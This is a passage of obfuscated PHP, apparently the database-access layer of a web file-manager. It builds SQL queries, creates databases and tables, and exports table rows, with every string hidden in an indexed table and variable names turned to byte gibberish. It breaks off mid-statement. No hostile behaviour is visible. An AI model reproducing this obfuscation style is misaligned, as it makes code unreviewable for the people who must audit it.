trim($ûŸ€ü¥); if (strpos($ûŸ€ü¥, $ø ø“Ìß[283])) { $ü×†×èã = explode($ø ø“Ìß[283], $ûŸ€ü¥); $óØ¯™›è = array(); foreach ($ü×†×èã as $ü«½òˆÙ => $ÍÙò©) { $ç€êİøã = $¸˜À‚í‘ ? $³ğğ·»¨[$ü«½òˆÙ] : $³ğğ·»¨; $óØ¯™›è[] = $ø ø“Ìß[260] . $this->parseWhereItem($this->parseKey($ÍÙò©), $ç€êİøã) . $ø ø“Ìß[905]; } $®´Ä¯‹ .= implode($ø ø“Ìß[1009], $óØ¯™›è); } elseif (strpos($ûŸ€ü¥, $ø ø“Ìß[284])) { $ü×†×èã = explode($ø ø“Ìß[284], $ûŸ€ü¥); $óØ¯™›è = array(); foreach ($ü×†×èã as $ü«½òˆÙ => $ÍÙò©) { $ç€êİøã = $¸˜À‚í‘ ? $³ğğ·»¨[$ü«½òˆÙ] : $³ğğ·»¨; $óØ¯™›è[] = $ø ø“Ìß[260] . $this->parseWhereItem($this->parseKey($ÍÙò©), $ç€êİøã) . $ø ø“Ìß[905]; } $®´Ä¯‹ .= implode($ø ø“Ìß[1004], $óØ¯™›è); } else { $®´Ä¯‹ .= $this->parseWhereItem($this->parseKey($ûŸ€ü¥), $³ğğ·»¨); } } $®´Ä¯‹ .= $ø ø“Ìß[278] . $ªäíµö•; } $®´Ä¯‹ = substr($®´Ä¯‹, 0, -strlen($ªäíµö•)); } return empty($®´Ä¯‹) ? $ø ø“Ìß[12] : $ø ø“Ìß[1010] . $®´Ä¯‹; } protected function parseWhereItem($ÓŞ¡¡ã, $ÒÑ…„üí) { $é†¾æ¾ğ =& $_SERVER[ĞÂ¤àÓï]; $õ™¸Àä = $é†¾æ¾ğ[12]; if (is_array($ÒÑ…„üí)) { if (is_string($ÒÑ…„üí[0])) { $ÙÅ„Æ© = strtolower($ÒÑ…„üí[0]); if (in_array($ÒÑ…„üí[0], array($é†¾æ¾ğ[884], $é†¾æ¾ğ[1011], $é†¾æ¾ğ[1012], $é†¾æ¾ğ[1013], $é†¾æ¾ğ[1014], $é†¾æ¾ğ[1015]))) { $õ™¸Àä .= $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $ÒÑ…„üí[0] . $é†¾æ¾ğ[53] . $this->parseValue($ÒÑ…„üí[1]); } elseif (preg_match($é†¾æ¾ğ[1016], $ÒÑ…„üí[0])) { $õ™¸Àä .= $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $this->exp[$ÙÅ„Æ©] . $é†¾æ¾ğ[53] . $this->parseValue($ÒÑ…„üí[1]); } elseif (preg_match($é†¾æ¾ğ[1017], $ÒÑ…„üí[0])) { if (is_array($ÒÑ…„üí[1])) { $±¹òöÕ = isset($ÒÑ…„üí[2]) ? strtoupper($ÒÑ…„üí[2]) : $é†¾æ¾ğ[1002]; if (in_array($±¹òöÕ, array($é†¾æ¾ğ[1001], $é†¾æ¾ğ[1002], $é†¾æ¾ğ[1003]))) { $à„ÊÜ¸™ = array(); foreach ($ÒÑ…„üí[1] as $à•€ñô­) { $à„ÊÜ¸™[] = $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $this->exp[$ÙÅ„Æ©] . $é†¾æ¾ğ[53] . $this->parseValue($à•€ñô­); } $õ™¸Àä .= $é†¾æ¾ğ[260] . implode($é†¾æ¾ğ[53] . $±¹òöÕ . $é†¾æ¾ğ[53], $à„ÊÜ¸™) . $é†¾æ¾ğ[905]; } } else { $õ™¸Àä .= $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $this->exp[$ÙÅ„Æ©] . $é†¾æ¾ğ[53] . $this->parseValue($ÒÑ…„üí[1]); } } elseif ($é†¾æ¾ğ[297] == $ÙÅ„Æ©) { $õ™¸Àä .= $é†¾æ¾ğ[903] . $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $ÒÑ…„üí[1] . $é†¾æ¾ğ[1018]; } elseif (preg_match($é†¾æ¾ğ[1019], $ÒÑ…„üí[0])) { $õ™¸Àä .= $ÒÑ…„üí[0]; } elseif (preg_match($é†¾æ¾ğ[1020], $ÒÑ…„üí[0])) { if (isset($ÒÑ…„üí[2]) && $é†¾æ¾ğ[297] == $ÒÑ…„üí[2]) { $õ™¸Àä .= $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $this->exp[$ÙÅ„Æ©] . $é†¾æ¾ğ[53] . $ÒÑ…„üí[1]; } else { if (is_string($ÒÑ…„üí[1])) { $ÒÑ…„üí[1] = explode($é†¾æ¾ğ[50], $ÒÑ…„üí[1]); } $Éòé¥¨  = implode($é†¾æ¾ğ[50], $this->parseValue($ÒÑ…„üí[1])); $õ™¸Àä .= $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $this->exp[$ÙÅ„Æ©] . $é†¾æ¾ğ[903] . $Éòé¥¨  . $é†¾æ¾ğ[905]; } } elseif (preg_match($é†¾æ¾ğ[1021], $ÒÑ…„üí[0])) { $ëÕôñÓé = is_string($ÒÑ…„üí[1]) ? explode($é†¾æ¾ğ[50], $ÒÑ…„üí[1]) : $ÒÑ…„üí[1]; $õ™¸Àä .= $é†¾æ¾ğ[903] . $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $this->exp[$ÙÅ„Æ©] . $é†¾æ¾ğ[53] . $this->parseValue($ëÕôñÓé[0]) . $é†¾æ¾ğ[1004] . $this->parseValue($ëÕôñÓé[1]) . $é†¾æ¾ğ[278]; } else { think_exception(think_lang($é†¾æ¾ğ[1007]) . $é†¾æ¾ğ[4] . $ÒÑ…„üí[0]); } } else { $õ•ÌÊñµ = count($ÒÑ…„üí); $©¨à¤Ì = $é†¾æ¾ğ[12]; if (is_string($ÒÑ…„üí[$õ•ÌÊñµ - 1])) { $©¨à¤Ì = isset($ÒÑ…„üí[$õ•ÌÊñµ - 1]) ? strtoupper($ÒÑ…„üí[$õ•ÌÊñµ - 1]) : $é†¾æ¾ğ[12]; if (in_array($©¨à¤Ì, array($é†¾æ¾ğ[1001], $é†¾æ¾ğ[1002], $é†¾æ¾ğ[1003]))) { $õ•ÌÊñµ = $õ•ÌÊñµ - 1; } } else { $©¨à¤Ì = $é†¾æ¾ğ[1001]; } for ($ê…Ê—û = 0; $ê…Ê—û < $õ•ÌÊñµ; $ê…Ê—û++) { $ëÕôñÓé = is_array($ÒÑ…„üí[$ê…Ê—û]) ? $ÒÑ…„üí[$ê…Ê—û][1] : $ÒÑ…„üí[$ê…Ê—û]; if ($é†¾æ¾ğ[297] == strtolower($ÒÑ…„üí[$ê…Ê—û][0])) { $õ™¸Àä .= $é†¾æ¾ğ[260] . $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $ëÕôñÓé . $é†¾æ¾ğ[1018] . $©¨à¤Ì . $é†¾æ¾ğ[53]; } else { $Äíôş·ä = is_array($ÒÑ…„üí[$ê…Ê—û]) ? $this->exp[strtolower($ÒÑ…„üí[$ê…Ê—û][0])] : $é†¾æ¾ğ[884]; if (!$Äíôş·ä && is_array($ÒÑ…„üí[$ê…Ê—û]) && in_array($ÒÑ…„üí[$ê…Ê—û][0], array($é†¾æ¾ğ[884], $é†¾æ¾ğ[1011], $é†¾æ¾ğ[1012], $é†¾æ¾ğ[1013], $é†¾æ¾ğ[1014], $é†¾æ¾ğ[1015]))) { $Äíôş·ä = $ÒÑ…„üí[$ê…Ê—û][0]; } $õ™¸Àä .= $é†¾æ¾ğ[260] . $ÓŞ¡¡ã . $é†¾æ¾ğ[53] . $Äíôş·ä . $é†¾æ¾ğ[53] . $this->parseValue($ëÕôñÓé) . $é†¾æ¾ğ[1018] . $©¨à¤Ì . $é†¾æ¾ğ[53]; } } $õ™¸Àä = substr($õ™¸Àä, 0, -4); } } else { $õ™¸Àä .= $ÓŞ¡¡ã . $é†¾æ¾ğ[1022] . $this->parseValue($ÒÑ…„üí); } return $õ™¸Àä; } protected function parseThinkWhere($”İ–ÎÜÖ, $”İõâÕŞ) { $“¤÷€˜ =& $_SERVER[ĞÂ¤àÓï]; $¸×Û©¦ı = $“¤÷€˜[12]; switch ($”İ–ÎÜÖ) { case $“¤÷€˜[352]: $¸×Û©¦ı = $”İõâÕŞ; break; case $“¤÷€˜[1005]: $¸×Û©¦ı = is_string($”İõâÕŞ) ? $”İõâÕŞ : substr($this->parseWhere($”İõâÕŞ), 6); break; case $“¤÷€˜[1023]: parse_str($”İõâÕŞ, $Ÿô÷±¦ô); if (isset($Ÿô÷±¦ô[$“¤÷€˜[1000]])) { $¤õà¤èÁ = $“¤÷€˜[53] . strtoupper($Ÿô÷±¦ô[$“¤÷€˜[1000]]) . $“¤÷€˜[53]; unset($Ÿô÷±¦ô[$“¤÷€˜[1000]]); } else { $¤õà¤èÁ = $“¤÷€˜[1004]; } $â¢¦Ë = array(); foreach ($Ÿô÷±¦ô as $åßÔŸ => $ö°¶çó¦) { $â¢¦Ë[] = $this->parseKey($åßÔŸ) . $“¤÷€˜[1022] . $this->parseValue($ö°¶çó¦); } $¸×Û©¦ı = implode($¤õà¤èÁ, $â¢¦Ë); break; } return $¸×Û©¦ı; } protected function parseLimit($êÎ˜Ûø) { $èöË²Æš =& $_SERVER[ĞÂ¤àÓï]; return !empty($êÎ˜Ûø) ? $èöË²Æš[51] . $êÎ˜Ûø . $èöË²Æš[53] : $èöË²Æš[12]; } protected function parseJoin($·ù„¢À”) { $İÂõ–›  =& $_SERVER[ĞÂ¤àÓï]; $ç¦˜àïğ = $İÂõ–› [12]; if (!empty($·ù„¢À”)) { if (is_array($·ù„¢À”)) { foreach ($·ù„¢À” as $Şš¾ìƒ§ => $İÉõî¼) { if (!1 !== stripos($İÉõî¼, $İÂõ–› [1024])) { $ç¦˜àïğ .= $İÂõ–› [53] . $İÉõî¼; } else { $ç¦˜àïğ .= $İÂõ–› [1025] . $İÉõî¼; } } } else { $ç¦˜àïğ .= $İÂõ–› [1025] . $·ù„¢À”; } } $ç¦˜àïğ = preg_replace($İÂõ–› [1026], think_config($İÂõ–› [930]) . $İÂõ–› [1027], $ç¦˜àïğ); return $ç¦˜àïğ; } protected function parseOrder($Ø­í‚‘Â) { $¦à–áš =& $_SERVER[ĞÂ¤àÓï]; if (is_array($Ø­í‚‘Â)) { $•Çë­Õİ = array(); foreach ($Ø­í‚‘Â as $ÄÃ“’… => $¶Ÿó‘¹«) { if (is_numeric($ÄÃ“’…)) { $•Çë­Õİ[] = $this->parseKey($¶Ÿó‘¹«); } else { $¶Ÿó‘¹« = in_array(strtoupper(trim($¶Ÿó‘¹«)), array($¦à–áš[1028], $¦à–áš[1029])) ? $¦à–áš[53] . $¶Ÿó‘¹« : $¦à–áš[12]; if (preg_match($¦à–áš[1030], $ÄÃ“’…)) { $•Çë­Õİ[] = $this->parseKey($ÄÃ“’…) . $¶Ÿó‘¹«; } else { think_exception($¦à–áš[1031] . $ÄÃ“’…); } } } $Ø­í‚‘Â = implode($¦à–áš[50], $•Çë­Õİ); } return !empty($Ø­í‚‘Â) ? $¦à–áš[1032] . $Ø­í‚‘Â : $¦à–áš[12]; } protected function parseGroup($¾¿Ğàûš) { $„²ªöÁ =& $_SERVER[ĞÂ¤àÓï]; return !empty($¾¿Ğàûš) ? $„²ªöÁ[1033] . $¾¿Ğàûš : $„²ªöÁ[12]; } protected function parseHaving($Ó»íÔó”) { $ÑØñ¡“ø =& $_SERVER[ĞÂ¤àÓï]; return !empty($Ó»íÔó”) ? $ÑØñ¡“ø[1034] . $Ó»íÔó” : $ÑØñ¡“ø[12]; } protected function parseComment($Ñ¸§´£¥) { $Öí®å™¤ =& $_SERVER[ĞÂ¤àÓï]; return !empty($Ñ¸§´£¥) ? $Öí®å™¤[1035] . $Ñ¸§´£¥ . $Öí®å™¤[1036] : $Öí®å™¤[12]; } protected function parseDistinct($ÅÄ¡ä±Á) { $Êñ¢¦Ó =& $_SERVER[ĞÂ¤àÓï]; return !empty($ÅÄ¡ä±Á) ? $Êñ¢¦Ó[1037] : $Êñ¢¦Ó[12]; } protected function parseUnion($ˆü„¢î) { $æ€à‘¯¥ =& $_SERVER[ĞÂ¤àÓï]; if (empty($ˆü„¢î)) { return $æ€à‘¯¥[12]; } if (isset($ˆü„¢î[$æ€à‘¯¥[348]])) { $ìÎÀá±Ï = $æ€à‘¯¥[1038]; unset($ˆü„¢î[$æ€à‘¯¥[348]]); } else { $ìÎÀá±Ï = $æ€à‘¯¥[1039]; } foreach ($ˆü„¢î as $ŸŒµúã£) { $ˆÊ¦íºÖ[] = $ìÎÀá±Ï . (is_array($ŸŒµúã£) ? $this->buildSelectSql($ŸŒµúã£) : $ŸŒµúã£); } return implode($æ€à‘¯¥[53], $ˆÊ¦íºÖ); } public function insert($ƒ¾ö‚Ö”, $ŞŸ¨Ã‰ = array(), $ûøúâ§ = false) { $„˜ûÁ‘ =& $_SERVER[ĞÂ¤àÓï]; $ìËã§Ï„ = $çÅ¢íüÊ = array(); $this->model = $ŞŸ¨Ã‰[$„˜ûÁ‘[281]]; foreach ($ƒ¾ö‚Ö” as $í„ş·ü‰ => $ùÜãÄú÷) { if (is_array($ùÜãÄú÷) && $„˜ûÁ‘[297] == $ùÜãÄú÷[0]) { $çÅ¢íüÊ[] = $this->parseKey($í„ş·ü‰); $ìËã§Ï„[] = $ùÜãÄú÷[1]; } elseif (is_scalar($ùÜãÄú÷) || is_null($ùÜãÄú÷)) { $çÅ¢íüÊ[] = $this->parseKey($í„ş·ü‰); $ìËã§Ï„[] = $this->parseValue($ùÜãÄú÷); } } $Ñ³“ÉÒ— = ($ûøúâ§ ? $„˜ûÁ‘[907] : $„˜ûÁ‘[908]) . $„˜ûÁ‘[909] . $this->parseTable($ŞŸ¨Ã‰[$„˜ûÁ‘[279]]) . $„˜ûÁ‘[903] . implode($„˜ûÁ‘[50], $çÅ¢íüÊ) . $„˜ûÁ‘[904] . implode($„˜ûÁ‘[50], $ìËã§Ï„) . $„˜ûÁ‘[905]; $Ñ³“ÉÒ— .= $this->parseLock(isset($ŞŸ¨Ã‰[$„˜ûÁ‘[850]]) ? $ŞŸ¨Ã‰[$„˜ûÁ‘[850]] : !1); $Ñ³“ÉÒ— .= $this->parseComment(!empty($ŞŸ¨Ã‰[$„˜ûÁ‘[354]]) ? $ŞŸ¨Ã‰[$„˜ûÁ‘[354]] : $„˜ûÁ‘[12]); return $this->execute($Ñ³“ÉÒ—, $this->parseBind(!empty($ŞŸ¨Ã‰[$„˜ûÁ‘[285]]) ? $ŞŸ¨Ã‰[$„˜ûÁ‘[285]] : array())); } public function selectInsert($„Ä´‰€ò, $œ‘«´ƒŠ, $ï¤õ€ã = array()) { $·¹¾‰Š =& $_SERVER[ĞÂ¤àÓï]; $this->model = $ï¤õ€ã[$·¹¾‰Š[281]]; if (is_string($„Ä´‰€ò)) { $„Ä´‰€ò = explode($·¹¾‰Š[50], $„Ä´‰€ò); } array_walk($„Ä´‰€ò, array($this, $·¹¾‰Š[906])); $ººëüè = $·¹¾‰Š[1040] . $this->parseTable($œ‘«´ƒŠ) . $·¹¾‰Š[903] . implode($·¹¾‰Š[50], $„Ä´‰€ò) . $·¹¾‰Š[1018]; $ººëüè .= $this->buildSelectSql($ï¤õ€ã); return $this->execute($ººëüè, $this->parseBind(!empty($ï¤õ€ã[$·¹¾‰Š[285]]) ? $ï¤õ€ã[$·¹¾‰Š[285]] : array())); } public function update($ı’Š òĞ, $Û¥ÆşÕ) { $ü‚İíà¨ =& $_SERVER[ĞÂ¤àÓï]; $this->model = $Û¥ÆşÕ[$ü‚İíà¨[281]]; $İ ÆÓÇ× = $ü‚İíà¨[1041] . $this->parseTable($Û¥ÆşÕ[$ü‚İíà¨[279]]) . $this->parseSet($ı’Š òĞ) . $this->parseWhere(!empty($Û¥ÆşÕ[$ü‚İíà¨[275]]) ? $Û¥ÆşÕ[$ü‚İíà¨[275]] : $ü‚İíà¨[12]) . $this->parseOrder(!empty($Û¥ÆşÕ[$ü‚İíà¨[365]]) ? $Û¥ÆşÕ[$ü‚İíà¨[365]] : $ü‚İíà¨[12]) . $this->parseLimit(!empty($Û¥ÆşÕ[$ü‚İíà¨[292]]) ? $Û¥ÆşÕ[$ü‚İíà¨[292]] : $ü‚İíà¨[12]) . $this->parseLock(isset($Û¥ÆşÕ[$ü‚İíà¨[850]]) ? $Û¥ÆşÕ[$ü‚İíà¨[850]] : !1) . $this->parseComment(!empty($Û¥ÆşÕ[$ü‚İíà¨[354]]) ? $Û¥ÆşÕ[$ü‚İíà¨[354]] : $ü‚İíà¨[12]); return $this->execute($İ ÆÓÇ×, $this->parseBind(!empty($Û¥ÆşÕ[$ü‚İíà¨[285]]) ? $Û¥ÆşÕ[$ü‚İíà¨[285]] : array())); } public function delete($½®Ü¤Öá = array()) { $ÆÊ“ğ‚ =& $_SERVER[ĞÂ¤àÓï]; $this->model = $½®Ü¤Öá[$ÆÊ“ğ‚[281]]; $˜âàÙó° = $ÆÊ“ğ‚[1042] . $this->parseTable($½®Ü¤Öá[$ÆÊ“ğ‚[279]]) . $this->parseWhere(!empty($½®Ü¤Öá[$ÆÊ“ğ‚[275]]) ? $½®Ü¤Öá[$ÆÊ“ğ‚[275]] : $ÆÊ“ğ‚[12]) . $this->parseOrder(!empty($½®Ü¤Öá[$ÆÊ“ğ‚[365]]) ? $½®Ü¤Öá[$ÆÊ“ğ‚[365]] : $ÆÊ“ğ‚[12]) . $this->parseLimit(!empty($½®Ü¤Öá[$ÆÊ“ğ‚[292]]) ? $½®Ü¤Öá[$ÆÊ“ğ‚[292]] : $ÆÊ“ğ‚[12]) . $this->parseLock(isset($½®Ü¤Öá[$ÆÊ“ğ‚[850]]) ? $½®Ü¤Öá[$ÆÊ“ğ‚[850]] : !1) . $this->parseComment(!empty($½®Ü¤Öá[$ÆÊ“ğ‚[354]]) ? $½®Ü¤Öá[$ÆÊ“ğ‚[354]] : $ÆÊ“ğ‚[12]); return $this->execute($˜âàÙó°, $this->parseBind(!empty($½®Ü¤Öá[$ÆÊ“ğ‚[285]]) ? $½®Ü¤Öá[$ÆÊ“ğ‚[285]] : array())); } public function select($èÃÆ©Ô = array()) { $ÈÆÕÈ¨‘ =& $_SERVER[ĞÂ¤àÓï]; $this->model = $èÃÆ©Ô[$ÈÆÕÈ¨‘[281]]; $œ„¦îèï = $this->buildSelectSql($èÃÆ©Ô); $‰¢€îğ× = isset($èÃÆ©Ô[$ÈÆÕÈ¨‘[349]]) ? $èÃÆ©Ô[$ÈÆÕÈ¨‘[349]] : !1; if ($‰¢€îğ×) { $‹„“šĞî = is_string($‰¢€îğ×[$ÈÆÕÈ¨‘[94]]) ? $‰¢€îğ×[$ÈÆÕÈ¨‘[94]] : $ÈÆÕÈ¨‘[1043] . md5($œ„¦îèï); $¿¢òÎ€ = think_cache($‹„“šĞî, $ÈÆÕÈ¨‘[12], $‰¢€îğ×); if (!1 !== $¿¢òÎ€) { return $¿¢òÎ€; } } $óÌ›œŠ = $this->query($œ„¦îèï, $this->parseBind(!empty($èÃÆ©Ô[$ÈÆÕÈ¨‘[285]]) ? $èÃÆ©Ô[$ÈÆÕÈ¨‘[285]] : array())); if ($‰¢€îğ× && !1 !== $óÌ›œŠ) { think_cache($‹„“šĞî, $óÌ›œŠ, $‰¢€îğ×); } return $óÌ›œŠ; } public function buildSelectSql($¨ÑÍÙÅ˜ = array()) { $ŒÕúÆĞ› =& $_SERVER[ĞÂ¤àÓï]; if (isset($¨ÑÍÙÅ˜[$ŒÕúÆĞ›[353]])) { if (strpos($¨ÑÍÙÅ˜[$ŒÕúÆĞ›[353]], $ŒÕúÆĞ›[50])) { list($Ìò«‚Ë¢, $‰ÚÓ¤…“) = explode($ŒÕúÆĞ›[50], $¨ÑÍÙÅ˜[$ŒÕúÆĞ›[353]]); } else { $Ìò«‚Ë¢ = $¨ÑÍÙÅ˜[$ŒÕúÆĞ›[353]]; } $Ìò«‚Ë¢ = $Ìò«‚Ë¢ ? $Ìò«‚Ë¢ : 1; $‰ÚÓ¤…“ = isset($‰ÚÓ¤…“) ? $‰ÚÓ¤…“ : (is_numeric($¨ÑÍÙÅ˜[$ŒÕúÆĞ›[292]]) ? $¨ÑÍÙÅ˜[$ŒÕúÆĞ›[292]] : 20); $Î®ã¨Üí = $‰ÚÓ¤…“ * ((int) $Ìò«‚Ë¢ - 1); $¨ÑÍÙÅ˜[$ŒÕúÆĞ›[292]] = $Î®ã¨Üí . $ŒÕúÆĞ›[50] . $‰ÚÓ¤…“; } if (think_config($ŒÕúÆĞ›[1044])) { $åó¸°ç½ = $ŒÕúÆĞ›[1045] . md5(serialize($¨ÑÍÙÅ˜)); $ËÙËã¡‚ = think_cache($åó¸°ç½); if ($ËÙËã¡‚) { return $ËÙËã¡‚; } } $Ÿ”ÖÎ«ë = $this->parseSql($this->selectSql, $¨ÑÍÙÅ˜); $Ÿ”ÖÎ«ë .= $this->parseLock(isset($¨ÑÍÙÅ˜[$ŒÕúÆĞ›[850]]) ? $¨ÑÍÙÅ˜[$ŒÕúÆĞ›[850]] : !1); if (isset($åó¸°ç½)) { think_cache($åó¸°ç½, $Ÿ”ÖÎ«ë); } return $Ÿ”ÖÎ«ë; } public function parseSql($ş÷™š‘û, $¯éğåÛ = array()) { $ÊÑ¬»™ =& $_SERVER[ĞÂ¤àÓï]; $ş÷™š‘û = str_replace(array($ÊÑ¬»™[1046], $ÊÑ¬»™[1047], $ÊÑ¬»™[1048], $ÊÑ¬»™[1049], $ÊÑ¬»™[1050], $ÊÑ¬»™[1051], $ÊÑ¬»™[1052], $ÊÑ¬»™[1053], $ÊÑ¬»™[1054], $ÊÑ¬»™[1055], $ÊÑ¬»™[1056]), array($this->parseTable("{$¯éğåÛ[$ÊÑ¬»™[279]]}"), $this->parseDistinct(isset($¯éğåÛ[$ÊÑ¬»™[1057]]) ? $¯éğåÛ[$ÊÑ¬»™[1057]] : !1), $this->parseField(!empty($¯éğåÛ[$ÊÑ¬»™[273]]) ? $¯éğåÛ[$ÊÑ¬»™[273]] : $ÊÑ¬»™[188]), $this->parseJoin(!empty($¯éğåÛ[$ÊÑ¬»™[282]]) ? $¯éğåÛ[$ÊÑ¬»™[282]] : $ÊÑ¬»™[12]), $this->parseWhere(!empty($¯éğåÛ[$ÊÑ¬»™[275]]) ? $¯éğåÛ[$ÊÑ¬»™[275]] : $ÊÑ¬»™[12]), $this->parseGroup(!empty($¯éğåÛ[$ÊÑ¬»™[515]]) ? $¯éğåÛ[$ÊÑ¬»™[515]] : $ÊÑ¬»™[12]), $this->parseHaving(!empty($¯éğåÛ[$ÊÑ¬»™[1058]]) ? $¯éğåÛ[$ÊÑ¬»™[1058]] : $ÊÑ¬»™[12]), $this->parseOrder(!empty($¯éğåÛ[$ÊÑ¬»™[365]]) ? $¯éğåÛ[$ÊÑ¬»™[365]] : $ÊÑ¬»™[12]), $this->parseLimit(!empty($¯éğåÛ[$ÊÑ¬»™[292]]) ? $¯éğåÛ[$ÊÑ¬»™[292]] : $ÊÑ¬»™[12]), $this->parseUnion(!empty($¯éğåÛ[$ÊÑ¬»™[347]]) ? $¯éğåÛ[$ÊÑ¬»™[347]] : $ÊÑ¬»™[12]), $this->parseComment(!empty($¯éğåÛ[$ÊÑ¬»™[354]]) ? $¯éğåÛ[$ÊÑ¬»™[354]] : $ÊÑ¬»™[12])), $ş÷™š‘û); return $ş÷™š‘û; } public function getLastSql($¿¢Â—Şı = '') { return $¿¢Â—Şı ? $this->modelSql[$¿¢Â—Şı] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($İ¦šëÄ’) { return addslashes($İ¦šëÄ’); } public function setModel($İŞ†åÊ·) { $this->model = $İŞ†åÊ·; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ëÓŸ®ÊÓ = array()) { $¥·³ƒõ´ =& $_SERVER[ĞÂ¤àÓï]; if (empty($ëÓŸ®ÊÓ)) { $ëÓŸ®ÊÓ = $GLOBALS[$¥·³ƒõ´[6]][$¥·³ƒõ´[21]]; } $this->database = $ëÓŸ®ÊÓ; } public function model($‘ŠôˆÒø = '') { return new ModelBase($‘ŠôˆÒø, $_SERVER[ĞÂ¤àÓï][12], $this->database); } public function db($ÎâÃ€ç‰ = false) { $ÚÎêî–† =& $_SERVER[ĞÂ¤àÓï]; $‰ò‰ÂÌÙ = array_change_key_case($this->database); if ($this->dbType() == $ÚÎêî–†[13] || !$ÎâÃ€ç‰) { return $this->model()->db(); } $ãøÉİïÚ = $‰ò‰ÂÌÙ[$ÚÎêî–†[972]]; $‰ò‰ÂÌÙ[$ÚÎêî–†[972]] = $ÚÎêî–†[12]; if ($‰ò‰ÂÌÙ[$ÚÎêî–†[967]] == $ÚÎêî–†[964]) { $êÔ‚³ÉŒ = $‰ò‰ÂÌÙ[$ÚÎêî–†[973]]; $‰ò‰ÂÌÙ[$ÚÎêî–†[973]] = substr($êÔ‚³ÉŒ, 0, strrpos($êÔ‚³ÉŒ, $ÚÎêî–†[1059])); } $this->database = $‰ò‰ÂÌÙ; $£Šåö± = $this->model()->db(); try { $ÑİòŸùŠ = $£Šåö±->execute("\163\150\157\x77\x20\144\x61\164\x61\142\x61\163\x65\x73\x20\154\x69\x6b\145\40\x27{$ãøÉİïÚ}\x27"); } catch (Exception $ÓÓØ®ò) { } if (!$ÑİòŸùŠ) { $£Šåö±->execute("\x63\162\x65\141\x74\x65\x20\x64\x61\x74\141\x62\x61\x73\x65\40\140{$ãøÉİïÚ}\140"); } $‰ò‰ÂÌÙ[$ÚÎêî–†[972]] = $ãøÉİïÚ; if ($‰ò‰ÂÌÙ[$ÚÎêî–†[967]] == $ÚÎêî–†[964]) { $‰ò‰ÂÌÙ[$ÚÎêî–†[973]] .= $ÚÎêî–†[1059] . $ãøÉİïÚ; } $this->database = $‰ò‰ÂÌÙ; $£Šåö±->execute("\165\x73\x65\40\x60{$ãøÉİïÚ}\140"); return $£Šåö±; } public function createTable($¤¶çÖ„Š, &$»˜š¢×) { $×òé· =& $_SERVER[ĞÂ¤àÓï]; if (!IO::exist($¤¶çÖ„Š)) { ActionCall($×òé·[1060], !0, 0); show_json(LNG($×òé·[1061]), !1); } $Û³ï¨œ¸ = $this->model()->db(); $¼ˆ€½Ï´ = sqlSplit(IO::getContent($¤¶çÖ„Š)); foreach ($¼ˆ€½Ï´ as $­µéü’Ù) { $ßÚîÁ“ü = stripos($­µéü’Ù, $×òé·[1062]) === 0; if ($ßÚîÁ“ü) { $»˜š¢×->task[$×òé·[793]] += 1; } $Û³ï¨œ¸->execute($­µéü’Ù); if ($ßÚîÁ“ü) { preg_match($×òé·[1063], $­µéü’Ù, $Ï™¼çŸ¢); $»˜š¢×->task[$×òé·[1064]] = $Ï™¼çŸ¢[1]; $»˜š¢×->update(1); } } } public function insertTable($¥æŒ®Á, &$‚•Êª» ) { $ª§Œ…ï¾ =& $_SERVER[ĞÂ¤àÓï]; $î®›ùØ™ = $this->model()->db(); $¤îâŒŠ® = $ÜÔÌŠï¤ ? array($ÜÔÌŠï¤) : $î®›ùØ™->getTables(); foreach ($¥æŒ®Á as $Æ‹ƒñ‰Ú) { $ÜÔÌŠï¤ = basename($Æ‹ƒñ‰Ú, $ª§Œ…ï¾[795]); if (!in_array($ÜÔÌŠï¤, $¤îâŒŠ®)) { continue; } $‚•Êª» ->task[$ª§Œ…ï¾[1064]] = $ÜÔÌŠï¤; if (get_filesize($Æ‹ƒñ‰Ú) == 0) { continue; } $Üû¹ê¤ø = $this->sqlToDb($Æ‹ƒñ‰Ú, $‚•Êª» ); if (!$Üû¹ê¤ø) { ActionCall($ª§Œ…ï¾[1060], !0, 0); show_json(LNG($ª§Œ…ï¾[1065]) . "\133{$ÜÔÌŠï¤}\135", !1); } } } public function sqlFromDb($ÃÙÅÔº¡, $‰êÄï›ß, &$ûÈ¸¼©Ï, $¼öªöø¢ = '') { if ($ûÈ¸¼©Ï) { $ûÈ¸¼©Ï->task[$_SERVER[ĞÂ¤àÓï][1064]] = $ÃÙÅÔº¡; } $çæ³§ = $this->model($ÃÙÅÔº¡); $ğË²¨ = 0; $²ÅˆøÌ = 0; $Š­ÒÆãï = 10000; $Öªƒ£Ğø = fopen($‰êÄï›ß, $_SERVER[ĞÂ¤àÓï][1066]); $ìÛÒÈÌ = $çæ³§->getPk(); $‚ ĞµİÜ = $çæ³§->getDbFields(); $íƒ¡ëŸ™ = $_SERVER[ĞÂ¤àÓï][12]; if ($GLOBALS[$_SERVER[ĞÂ¤àÓï][794]] && in_array($ÃÙÅÔº¡, array($_SERVER[ĞÂ¤àÓï][1067], $_SERVER[ĞÂ¤àÓï][1068]))) { $íƒ¡ëŸ™ = $ÃÙÅÔº¡; } do { $£¢¨­ó° = array($ìÛÒÈÌ => array($_SERVER[ĞÂ¤àÓï][1014], $²ÅˆøÌ)); $Â…³¯± = $çæ³§->where($£¢¨­ó°)->field($‚ ĞµİÜ)->order($ìÛÒÈÌ . $_SERVER[ĞÂ¤àÓï][1069])->limit($Š­ÒÆãï)->select(); $Â…³¯± = !empty($Â…³¯±) ? $Â…³¯± : array(); if (!($éçÄ­å² = count($Â…³¯±))) { break; } $‘óÙœ¹µ = end($Â…³¯±); $²ÅˆøÌ = $‘óÙœ¹µ[$ìÛÒÈÌ]; $Ê´¼™¶É = array(); foreach ($Â…³¯± as $ô¥à¸ã§) { if ($íƒ¡ëŸ™) { if ($ÃÙÅÔº¡ == $_SERVER[ĞÂ¤àÓï][1067]) { if ($ô¥à¸ã§[$_SERVER[ĞÂ¤àÓï][33]] == $_SERVER[ĞÂ¤àÓï][1070]) { $Øí’§ÖÇ = 